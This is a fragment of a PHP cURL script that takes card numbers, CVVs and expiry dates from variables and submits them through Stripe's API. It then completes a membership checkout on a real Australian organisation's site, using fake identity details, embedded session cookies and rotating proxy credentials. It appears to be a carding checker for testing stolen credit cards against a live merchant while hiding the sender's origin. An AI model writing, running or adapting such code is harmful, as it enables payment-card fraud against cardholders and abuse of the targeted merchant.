...
# -------------------- [WEBSHARE PROXY] -------------------#
$webshareuser = 'skltqoro-rotate';
$websharepass = '1xxvskhf5a9y';
$webshareport = 80;
...
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/api3/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/api3/cookie.txt');

# ----------------- [1REQ POSTFIELDS] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][line1]=1045+American+Drive&billing_details[address][line2]=&billing_details[address][city]=New+York&billing_details[address][state]=NY&billing_details[address][postal_code]=10080&billing_details[address][country]=US&billing_details[name]=Wiz+Venex&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=1c3d5b2b-d704-4245-8fc1-37c9e58b7b4457d523&sid=NA&payment_user_agent=stripe.js%2Fcf29b62f3%3B+stripe-js-v3%2Fcf29b62f3&time_on_page=49455&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1855GBDkr7lWlvKy');
...
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$webshareuser:$websharepass");
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://afsa.org.au/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
...
'referer:https://afsa.org.au/membership-account/membership-checkout/',
//:gzip, deflate, br',
'accept-language:en-US,en;q=0.9',
'cookie:__stripe_mid=1c3d5b2b-d704-4245-8fc1-37c9e58b7b4457d523',
'cookie:PHPSESSID=6qqt8noku3pf4o4srkpneu42e6',
'cookie:pmpro_visit=1',));

# ----------------- [2REQ POSTFIELDS] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'level=1&checkjavascript=1&price=76&username='.$firstname.''.$lastname.'&password='.$email.'&password2='.$email.'&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&first_nations=No&first_nations_country=United+States&gender=Non-Binary&age_group=26-35&farm_name='.$firstname.'&farm_website='.$email.'&csa=No&farm_about='.$firstname.'+'.$lastname.'&volunteer=no_i_wont&bcountry=US&bfirstname='.$firstname.'&blastname='.$lastname.'&baddress1='.$zip.'+'.$firstname.'+'.$lastname.'&baddress2=&bcity=New+York&bstate='.$state.'&bzipcode='.$zip.'&bphone='.$phone.'&CardType=visa&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX1517&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');
